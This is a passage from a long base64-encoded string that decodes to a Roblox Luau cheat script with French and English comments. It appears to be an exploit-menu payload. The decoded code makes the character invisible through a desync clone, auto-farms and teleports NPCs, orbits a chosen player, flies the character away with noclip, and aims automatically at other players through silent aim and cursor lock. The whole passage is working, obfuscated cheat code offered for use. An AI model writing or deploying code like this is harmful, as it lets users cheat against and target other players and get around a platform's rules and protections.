GFyYWN0ZXI6R2V0RGVzY2VuZGFudHMoKSkgZG8KICAgICAgICAgICAgaWYgcGFydDpJc0EoIkJhc2VQYXJ0IikgdGhlbgogICAgICAgICAgICAgICAgcGFydC5UcmFuc3BhcmVuY3kgPSAxCiAgICAgICAgICAgICAgICBwYXJ0LkNhbkNvbGxpZGUgPSBmYWxzZQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAogICAgCiAgICBsb2NhbCBmdW5jdGlvbiBkaXNhYmxlRGVzeW5jKCkKICAgICAgICBpZiBub3QgY2hhcmFjdGVyIHRoZW4gcmV0dXJuIGVuZAogICAgICAgIGlzRGVzeW5jRW5hYmxlZCA9IGZhbHNlCiAgICAgICAgCiAgICAgICAgLS0gRMOpdHJ1aXJlIGxlIGNsb25lCiAgICAgICAgaWYgZGVzeW5jQ2xvbmUgdGhlbgogICAgICAgICAgICBkZXN5bmNDbG9uZTpEZXN0cm95KCkKICAgICAgICAgICAgZGVzeW5jQ2xvbmUgPSBuaWwKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICAtLSBEw6lnZWxlciBsZSB2cmFpIGNoYXJhY3RlcgogICAgICAgIGlmIHJvb3RQYXJ0IHRoZW4KICAgICAgICAgICAgcm9vdFBhcnQuQW5jaG9yZWQgPSBmYWxzZQogICAgICAgICAgICByb290UGFydC5DYW5Db2xsaWRlID0gdHJ1ZQogICAgICAgIGVuZAogICAgICAgIAogICAgICAgIC0tIFJlbmRyZSBsZSB2cmFpIGNoYXJhY3RlciB2aXNpYmxlIMOgIG5vdXZlYXUKICAgICAgICBmb3IgXywgcGFydCBpbiBwYWlycyhjaGFyYWN0ZXI6R2V0RGVzY2VuZGFudHMoKSkgZG8KICAgICAgICAgICAgaWYgcGFydDpJc0EoIkJhc2VQYXJ0IikgdGhlbgogICAgICAgICAgICAgICAgcGFydC5UcmFuc3BhcmVuY3kgPSAwCiAgICAgICAgICAgICAgICBwYXJ0LkNhbkNvbGxpZGUgPSB0cnVlCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCiAgICAKICAgIC0tIERFU1lOQyBMT09QIC0gQm91Z2VyIGxlIHZyYWkgY2hhcmFjdGVyIGludmlzaWJsZQogICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgd2hpbGUgQ29uZmlnLklzUnVubmluZyBkbwogICAgICAgICAgICBpZiBpc0Rlc3luY0VuYWJsZWQgYW5kIGNoYXJhY3RlciBhbmQgcm9vdFBhcnQgdGhlbgogICAgICAgICAgICAgICAgLS0gTW91dmVtZW50IG5vcm1hbCBkdSBjaGFyYWN0ZXIgKGludmlzaWJsZSkKICAgICAgICAgICAgICAgIGlmIGh1bWFub2lkIGFuZCBodW1hbm9pZC5IZWFsdGggPiAwIHRoZW4KICAgICAgICAgICAgICAgICAgICAtLSBBcHBsaXF1ZXIgbGEgdml0ZXNzZSBkZSBtYXJjaGUgbm9ybWFsZW1lbnQKICAgICAgICAgICAgICAgICAgICBpZiBDb25maWcuV2Fsa1NwZWVkVmFsdWUgPiAwIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgaHVtYW5vaWQuV2Fsa1NwZWVkID0gQ29uZmlnLldhbGtTcGVlZFZhbHVlCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMDE2KQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4xKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZCkKICAgIAogICAgLS0gRkFSTSBORUFSRVNUIExPT1AKICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgIHdoaWxlIENvbmZpZy5Jc1J1bm5pbmcgZG8KICAgICAgICAgICAgaWYgQ29uZmlnLkZhcm1OZWFyZXN0IGFuZCBjaGFyYWN0ZXIgYW5kIHJvb3RQYXJ0IHRoZW4KICAgICAgICAgICAgICAgIC0tIEF1dG8gRXF1aXAgU3dvcmQKICAgICAgICAgICAgICAgIEVxdWlwU2VsZWN0ZWRXZWFwb24oKQogICAgICAgICAgICAgICAgaWYgY2hhcmFjdGVyIGFuZCBub3QgY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiVG9vbCIpIGFuZCBwbGF5ZXI6RmluZEZpcnN0Q2hpbGQoIkJhY2twYWNrIikgdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIHRvb2xUb0VxdWlwID0gbmlsCiAgICAgICAgICAgICAgICAgICAgZm9yIF8sIHQgaW4gcGFpcnMocGxheWVyLkJhY2twYWNrOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHQ6SXNBKCJUb29sIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdC5OYW1lOmxvd2VyKCk6ZmluZCgic3dvcmQiKSBvciB0Lk5hbWU6bG93ZXIoKTpmaW5kKCJibGFkZSIpIG9yIHQuTmFtZTpsb3dlcigpOmZpbmQoImthdGFuYSIpIG9yIHQuTmFtZTpsb3dlcigpOmZpbmQoInNhYmVyIikgb3IgdC5OYW1lOmxvd2VyKCk6ZmluZCgiY3V0bGFzcyIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b29sVG9FcXVpcCA9IHQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGlmIG5vdCB0b29sVG9FcXVpcCB0aGVuIHRvb2xUb0VxdWlwID0gcGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiVG9vbCIpIGVuZAogICAgICAgICAgICAgICAgICAgIGlmIHRvb2xUb0VxdWlwIGFuZCBodW1hbm9pZCB0aGVuIGh1bWFub2lkOkVxdWlwVG9vbCh0b29sVG9FcXVpcCkgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgbG9jYWwgdGFyZ2V0ID0gbmlsCiAgICAgICAgICAgICAgICBsb2NhbCBtaW5EaXN0ID0gOTk5OTkKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgLS0gSGVscGVyIHRvIHNjYW4gZm9sZGVycwogICAgICAgICAgICAgICAgbG9jYWwgZnVuY3Rpb24gc2NhbkZvbGRlcihmb2xkZXIpCiAgICAgICAgICAgICAgICAgICAgZm9yIF8sIG9iaiBpbiBwYWlycyhmb2xkZXI6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgaWYgb2JqOklzQSgiTW9kZWwiKSBhbmQgb2JqIH49IGNoYXJhY3RlciBhbmQgb2JqOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZCIpIGFuZCBvYmo6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBvYmouSHVtYW5vaWQuSGVhbHRoID4gMCBhbmQgbm90IFBsYXllcnM6R2V0UGxheWVyRnJvbUNoYXJhY3RlcihvYmopIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBkaXN0ID0gKHJvb3RQYXJ0LlBvc2l0aW9uIC0gb2JqLkh1bWFub2lkUm9vdFBhcnQuUG9zaXRpb24pLk1hZ25pdHVkZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGRpc3QgPCBtaW5EaXN0IHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbWluRGlzdCA9IGRpc3QKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFyZ2V0ID0gb2JqCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgc2NhbkZvbGRlcihXb3Jrc3BhY2UpCiAgICAgICAgICAgICAgICBpZiBXb3Jrc3BhY2U6RmluZEZpcnN0Q2hpbGQoIkVuZW1pZXMiKSB0aGVuIHNjYW5Gb2xkZXIoV29ya3NwYWNlLkVuZW1pZXMpIGVuZAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBsb2NhbCBmdW5jdGlvbiBicmluZ01vYnMoZm9sZGVyKQogICAgICAgICAgICAgICAgICAgIGZvciBfLCBvYmogaW4gcGFpcnMoZm9sZGVyOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG9iajpJc0EoIk1vZGVsIikgYW5kIG9iaiB+PSBjaGFyYWN0ZXIgYW5kIG9iajpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpIGFuZCBvYmo6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgb2JqLkh1bWFub2lkLkhlYWx0aCA+IDAgYW5kIG5vdCBQbGF5ZXJzOkdldFBsYXllckZyb21DaGFyYWN0ZXIob2JqKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgZVJvb3QgPSBvYmouSHVtYW5vaWRSb290UGFydAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChlUm9vdC5Qb3NpdGlvbiAtIHJvb3RQYXJ0LlBvc2l0aW9uKS5NYWduaXR1ZGUgPD0gQ29uZmlnLkJyaW5nUmFuZ2UgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlUm9vdC5DRnJhbWUgPSByb290UGFydC5DRnJhbWUgKiBDRnJhbWUubmV3KDAsIC0xNSwgMCkgLS0gQnJpbmcgdW5kZXIgcGxheWVyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVSb290LkNhbkNvbGxpZGUgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlUm9vdC5Bc3NlbWJseUxpbmVhclZlbG9jaXR5ID0gVmVjdG9yMy5uZXcoMCwwLDApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVSb290LkFzc2VtYmx5QW5ndWxhclZlbG9jaXR5ID0gVmVjdG9yMy5uZXcoMCwwLDApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaWYgdGFyZ2V0IHRoZW4KICAgICAgICAgICAgICAgICAgICBsb2NhbCB0SHVtID0gdGFyZ2V0Lkh1bWFub2lkCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgdFJvb3QgPSB0YXJnZXQuSHVtYW5vaWRSb290UGFydAogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIC0tIEVuYWJsZSBGbHkgKEJvZHlWZWxvY2l0eSkKICAgICAgICAgICAgICAgICAgICBsb2NhbCBidiA9IHJvb3RQYXJ0OkZpbmRGaXJzdENoaWxkKCJGYXJtVmVsb2NpdHkiKQogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBidiB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGJ2ID0gSW5zdGFuY2UubmV3KCJCb2R5VmVsb2NpdHkiKQogICAgICAgICAgICAgICAgICAgICAgICBidi5OYW1lID0gIkZhcm1WZWxvY2l0eSIKICAgICAgICAgICAgICAgICAgICAgICAgYnYuTWF4Rm9yY2UgPSBWZWN0b3IzLm5ldyhtYXRoLmh1Z2UsIG1hdGguaHVnZSwgbWF0aC5odWdlKQogICAgICAgICAgICAgICAgICAgICAgICBidi5WZWxvY2l0eSA9IFZlY3RvcjMubmV3KDAsMCwwKQogICAgICAgICAgICAgICAgICAgICAgICBidi5QYXJlbnQgPSByb290UGFydAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIC0tIEF0dGFjayBMb29wCiAgICAgICAgICAgICAgICAgICAgd2hpbGUgQ29uZmlnLkZhcm1OZWFyZXN0IGFuZCB0YXJnZXQgYW5kIHRIdW0uSGVhbHRoID4gMCBhbmQgcm9vdFBhcnQgZG8KICAgICAgICAgICAgICAgICAgICAgICAgLS0gRmx5IExvZ2ljIChUd2Vlbi9MZXJwIHRvIHRhcmdldCkKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgdGFyZ2V0UG9zID0gdFJvb3QuUG9zaXRpb24gKyBWZWN0b3IzLm5ldygwLCAyMCwgMCkgLS0gMjAgc3R1ZHMgYWJvdmUKICAgICAgICAgICAgICAgICAgICAgICAgcm9vdFBhcnQuQ0ZyYW1lID0gcm9vdFBhcnQuQ0ZyYW1lOkxlcnAoQ0ZyYW1lLm5ldyh0YXJnZXRQb3MsIHRSb290LlBvc2l0aW9uKSwgMC41KQogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgLS0gQnJpbmcgTW9icwogICAgICAgICAgICAgICAgICAgICAgICBpZiBDb25maWcuQnJpbmdNb2IgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJpbmdNb2JzKFdvcmtzcGFjZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIFdvcmtzcGFjZTpGaW5kRmlyc3RDaGlsZCgiRW5lbWllcyIpIHRoZW4gYnJpbmdNb2JzKFdvcmtzcGFjZS5FbmVtaWVzKSBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAtLSBTcGFtIENsaWNrCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHNjcmVlblBvcywgb25TY3JlZW4gPSBjYW1lcmE6V29ybGRUb1ZpZXdwb3J0UG9pbnQodFJvb3QuUG9zaXRpb24pCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG9uU2NyZWVuIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIE51Y2xlYXJDbGljayhWZWN0b3IyLm5ldyhzY3JlZW5Qb3MuWCwgc2NyZWVuUG9zLlkpKQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBOdWNsZWFyQ2xpY2soKQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIFJ1blNlcnZpY2UuSGVhcnRiZWF0OldhaXQoKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjUpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgaWYgcm9vdFBhcnQgdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIGJ2ID0gcm9vdFBhcnQ6RmluZEZpcnN0Q2hpbGQoIkZhcm1WZWxvY2l0eSIpCiAgICAgICAgICAgICAgICAgICAgaWYgYnYgdGhlbiBidjpEZXN0cm95KCkgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjUpCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgIGVuZAogICAgZW5kKQogICAgCiAgICAtLSBPUkJJVCBQTEFZRVIgTE9PUAogICAgbG9jYWwgb3JiaXRSb3QgPSAxMAogICAgdGFibGUuaW5zZXJ0KENvbm5lY3Rpb25zLCBSdW5TZXJ2aWNlLlN0ZXBwZWQ6Q29ubmVjdChmdW5jdGlvbih0LCBkdCkKICAgICAgICBpZiBDb25maWcuT3JiaXRQbGF5ZXIgYW5kIENvbmZpZy5PcmJpdFBsYXllclRhcmdldCB+PSAiIiBhbmQgY2hhcmFjdGVyIGFuZCByb290UGFydCB0aGVuCiAgICAgICAgICAgIGxvY2FsIHRhcmdldFBsYXllciA9IFBsYXllcnM6RmluZEZpcnN0Q2hpbGQoQ29uZmlnLk9yYml0UGxheWVyVGFyZ2V0KQogICAgICAgICAgICBpZiB0YXJnZXRQbGF5ZXIgYW5kIHRhcmdldFBsYXllci5DaGFyYWN0ZXIgdGhlbgogICAgICAgICAgICAgICAgbG9jYWwgdGFyZ2V0Um9vdCA9IHRhcmdldFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgICAgICAgICAgICAgaWYgdGFyZ2V0Um9vdCB0aGVuCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgc3BlZWQgPSAxCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgcmFkaXVzID0gMSAtLSBJbmNyZWFzZWQgZnJvbSAyIHRvIDUgZm9yIGJldHRlciB2aXNpYmlsaXR5CiAgICAgICAgICAgICAgICAgICAgbG9jYWwgZWNsaXBzZSA9IDEKICAgICAgICAgICAgICAgICAgICBsb2NhbCByb3RhdGlvbiA9IENGcmFtZS5BbmdsZXMoMTAwLCA1MCwgMCkKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBsb2NhbCBzaW4sIGNvcyA9IG1hdGguc2luLCBtYXRoLmNvcwogICAgICAgICAgICAgICAgICAgIGxvY2FsIHJvdHNwZWVkID0gbWF0aC5waSAqIDIgLyBzcGVlZAogICAgICAgICAgICAgICAgICAgIGVjbGlwc2UgPSBlY2xpcHNlICogcmFkaXVzCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgb3JiaXRSb3QgPSBvcmJpdFJvdCArIGR0ICogcm90c3BlZWQKICAgICAgICAgICAgICAgICAgICByb290UGFydC5DRnJhbWUgPSByb3RhdGlvbiAqIENGcmFtZS5uZXcoc2luKG9yYml0Um90KSAqIGVjbGlwc2UsIDAsIGNvcyhvcmJpdFJvdCkgKiByYWRpdXMpICsgdGFyZ2V0Um9vdC5Qb3NpdGlvbgogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIHJvb3RQYXJ0LlZlbG9jaXR5ID0gVmVjdG9yMy5uZXcoMCwgMCwgMCkKICAgICAgICAgICAgICAgICAgICByb290UGFydC5Bc3NlbWJseUxpbmVhclZlbG9jaXR5ID0gVmVjdG9yMy5uZXcoMCwgMCwgMCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZCkpCgogICAgLS0gUEFOSUMgTU9ERSBMT09QCiAgICB0YWJsZS5pbnNlcnQoQ29u" .. "bmVjdGlvbnMsIFJ1blNlcnZpY2UuUmVuZGVyU3RlcHBlZDpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAtLSBBdXRvIFBhbmljIExvZ2ljCiAgICAgICAgaWYgQ29uZmlnLlBhbmljTW9kZUhlYWx0aEVuYWJsZSBhbmQgY2hhcmFjdGVyIGFuZCBodW1hbm9pZCB0aGVuCiAgICAgICAgICAgIGlmIGh1bWFub2lkLkhlYWx0aCA+IDAgdGhlbgogICAgICAgICAgICAgICAgaWYgbm90IENvbmZpZy5QYW5pY01vZGUgYW5kIGh1bWFub2lkLkhlYWx0aCA8PSBDb25maWcuUGFuaWNNb2RlTWluSGVhbHRoIHRoZW4KICAgICAgICAgICAgICAgICAgICBDb25maWcuUGFuaWNNb2RlID0gdHJ1ZQogICAgICAgICAgICAgICAgICAgIGlmIFRvZ2dsZUJ1dHRvbnNbIlBhbmljTW9kZSJdIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgVG9nZ2xlQnV0dG9uc1siUGFuaWNNb2RlIl0uQmFja2dyb3VuZENvbG9yMyA9IEN1cnJlbnRUaGVtZUNvbG9yCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbHNlaWYgQ29uZmlnLlBhbmljTW9kZSBhbmQgaHVtYW5vaWQuSGVhbHRoID49IENvbmZpZy5QYW5pY01vZGVNYXhIZWFsdGggdGhlbgogICAgICAgICAgICAgICAgICAgIENvbmZpZy5QYW5pY01vZGUgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgIGlmIFRvZ2dsZUJ1dHRvbnNbIlBhbmljTW9kZSJdIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgVG9nZ2xlQnV0dG9uc1siUGFuaWNNb2RlIl0uQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDQwLCA0MCwgNTApCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCgogICAgICAgIGlmIENvbmZpZy5QYW5pY01vZGUgYW5kIGNoYXJhY3RlciBhbmQgcm9vdFBhcnQgdGhlbgogICAgICAgICAgICBpZiBodW1hbm9pZCB0aGVuCiAgICAgICAgICAgICAgICBodW1hbm9pZC5QbGF0Zm9ybVN0YW5kID0gdHJ1ZQogICAgICAgICAgICAgICAgaHVtYW5vaWQ6Q2hhbmdlU3RhdGUoRW51bS5IdW1hbm9pZFN0YXRlVHlwZS5QaHlzaWNzKQogICAgICAgICAgICBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIC0tIE1vdmUgdXAgdmVyeSBmYXN0IChJbmZpbml0ZSBBc2NlbnQpCiAgICAgICAgICAgIHJvb3RQYXJ0LkNGcmFtZSA9IHJvb3RQYXJ0LkNGcmFtZSArIFZlY3RvcjMubmV3KDAsIDEwMDAwLCAwKQogICAgICAgICAgICByb290UGFydC5Bc3NlbWJseUxpbmVhclZlbG9jaXR5ID0gVmVjdG9yMy5uZXcoMCwgMTAwMDAwLCAwKQogICAgICAgICAgICAKICAgICAgICAgICAgLS0gRm9yY2UgTm9jbGlwCiAgICAgICAgICAgIGZvciBfLCB2IGluIHBhaXJzKGNoYXJhY3RlcjpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICAgICAgaWYgdjpJc0EoIkJhc2VQYXJ0IikgdGhlbiB2LkNhbkNvbGxpZGUgPSBmYWxzZSBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQpKQoKICAgIC0tID09PSBBSU0gQVNTSVNUIC8gRkxJQ0sgT04gQVRUQUNLIChGSVggRk9SIFNLSUxMUykgPT09CiAgICBSdW5TZXJ2aWNlOkJpbmRUb1JlbmRlclN0ZXAoIkFpbUxvY2tQcmlvcml0eSIsIEVudW0uUmVuZGVyUHJpb3JpdHkuQ2FtZXJhLlZhbHVlICsgMSwgZnVuY3Rpb24oKQogICAgICAgIGlmIENvbmZpZy5TaWxlbnRBaW0gdGhlbgogICAgICAgICAgICBpZiBJc0NvbWJhdEtleURvd24oKSB0aGVuCiAgICAgICAgICAgICAgICAtLSBWZXJyb3VpbGxhZ2UgIlN0aWNreSIgOiBvbiBnYXJkZSBsYSBtw6ptZSBjaWJsZSB0YW50IHF1J29uIGFwcHVpZQogICAgICAgICAgICAgICAgaWYgbm90IGNvbWJhdFRhcmdldCB0aGVuCiAgICAgICAgICAgICAgICAgICAgY29tYmF0VGFyZ2V0ID0gZ2V0Q2xvc2VzdFBsYXllclRvTW91c2UoQ29uZmlnLlNpbGVudEZPViwgdHJ1ZSkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpZiBjb21iYXRUYXJnZXQgYW5kIGNvbWJhdFRhcmdldC5DaGFyYWN0ZXIgYW5kIGNvbWJhdFRhcmdldC5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikgYW5kIGNvbWJhdFRhcmdldC5DaGFyYWN0ZXIuSHVtYW5vaWQuSGVhbHRoID4gMCB0aGVuCiAgICAgICAgICAgICAgICAgICAgLS0gUHJpb3JpdMOpIGF1IFRvcnNlIChIdW1hbm9pZFJvb3RQYXJ0KSBjYXIgcGx1cyBncm9zCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgdGFyZ2V0UGFydCA9IGNvbWJhdFRhcmdldC5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSBvciBjb21iYXRUYXJnZXQuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJUb3JzbyIpIG9yIGNvbWJhdFRhcmdldC5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkhlYWQiKQogICAgICAgICAgICAgICAgICAgIGlmIHRhcmdldFBhcnQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBzY3JlZW5Qb3MsIG9uU2NyZWVuID0gY2FtZXJhOldvcmxkVG9WaWV3cG9ydFBvaW50KHRhcmdldFBhcnQuUG9zaXRpb24pCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG9uU2NyZWVuIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFZpcnR1YWxJbnB1dE1hbmFnZXI6U2VuZE1vdXNlTW92ZUV2ZW50KHNjcmVlblBvcy5YLCBzY3JlZW5Qb3MuWSwgZ2FtZSkKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgY29tYmF0VGFyZ2V0ID0gbmlsIC0tIENpYmxlIHBlcmR1ZSBvdSBtb3J0ZQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIGNvbWJhdFRhcmdldCA9IG5pbCAtLSBUb3VjaGUgcmVsw6JjaMOpZQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICAtLSBDVVJTT1IgTE9DSyBMT0dJQwogICAgICAgIGlmIENvbmZpZy5DdXJzb3JMb2NrIHRoZW4KICAgICAgICAgICAgLS0gMS4gUGVyc2lzdGVudCBVc2VyIENoZWNrCiAgICAgICAgICAgIGlmIENvbmZpZy5DdXJzb3JMb2NrVXNlciB+PSAiIiB0aGVuCiAgICAgICAgICAgICAgICBsb2NhbCB0YXJnZXRQbHIgPSBuaWwKICAgICAgICAgICAgICAgIGZvciBfLCBwIGluIHBhaXJzKFBsYXllcnM6R2V0UGxheWVycygpKSBkbwogICAgICAgICAgICAgICAgICAgIGlmIHAgfj0gcGxheWVyIGFuZCAocC5OYW1lOmxvd2VyKCk6ZmluZChDb25maWcuQ3Vyc29yTG9ja1VzZXI6bG93ZXIoKSkgb3IgcC5EaXNwbGF5TmFtZTpsb3dlcigpOmZpbmQoQ29uZmlnLkN1cnNvckxvY2tVc2VyOmxvd2VyKCkpKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHRhcmdldFBsciA9IHAKICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpZiB0YXJnZXRQbHIgYW5kIHRhcmdldFBsci5DaGFyYWN0ZXIgYW5kIHRhcmdldFBsci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikgYW5kIHRhcmdldFBsci5DaGFyYWN0ZXIuSHVtYW5vaWQuSGVhbHRoID4gMCB0aGVuCiAgICAgICAgICAgICAgICAgICAgIGN1cnNvckxvY2tUYXJnZXQgPSB0YXJnZXRQbHIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgIEN1cnNvckxhYmVsLlRleHQgPSAiUEVSU0lTVEVOVDogIiAuLiB0YXJnZXRQbHIuTmFtZQogICAgICAgICAgICAgICAgICAgICBDdXJzb3JMYWJlbC5UZXh0Q29sb3IzID0gQ3VycmVudFRoZW1lQ29sb3IKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIGlmIGN1cnNvckxvY2tUYXJnZXQgdGhlbgogICAgICAgICAgICAgICAgIGlmIGN1cnNvckxvY2tUYXJnZXQuUGFyZW50IGFuZCBjdXJzb3JMb2NrVGFyZ2V0OkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZCIpIGFuZCBjdXJzb3JMb2NrVGFyZ2V0Lkh1bWFub2lkLkhlYWx0aCA+IDAgdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIHRhcmdldFBhcnQgPSBjdXJzb3JMb2NrVGFyZ2V0OkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0Iikgb3IgY3Vyc29yTG9ja1RhcmdldDpGaW5kRmlyc3RDaGlsZCgiVG9yc28iKSBvciBjdXJzb3JMb2NrVGFyZ2V0OkZpbmRGaXJzdENoaWxkKCJVcHBlclRvcnNvIikgb3IgY3Vyc29yTG9ja1RhcmdldDpGaW5kRmlyc3RDaG